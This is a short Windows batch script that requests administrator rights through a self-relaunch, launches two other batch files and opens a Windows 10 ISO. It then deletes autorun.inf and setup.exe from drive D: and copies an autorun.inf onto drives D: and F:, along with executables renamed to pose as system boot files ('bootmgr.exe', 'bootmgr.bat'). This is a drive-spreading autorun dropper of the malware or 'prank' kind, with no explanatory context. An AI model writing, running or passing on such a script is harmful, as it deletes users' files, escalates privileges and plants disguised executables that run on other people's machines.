@echo off
start minecod.bat
start mince.bat
if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
echo %time%
timeout 5 > NUL
echo %time%
start F:\Win10_22H2_Turkish_x64.iso
start D:\Win10_22H2_Turkish_x64.iso
start F:\Win10_22H2_Turkish_x64.iso
start D:\Win10_22H2_Turkish_x64.iso
cd F:
del D:\autorun.inf
del D:\setup.exe
copy system.inf "F:\autorun.inf"
copy mapoto.bat "F:\bootmgr.bat"
copy pranktails.exe "F:\bootmgr.exe"
copy system.inf "D:\autorun.inf"
copy mapoto.bat "D:\bootmgr.bat"
copy pranktails.exe "D:\bootmgr.exe"
pause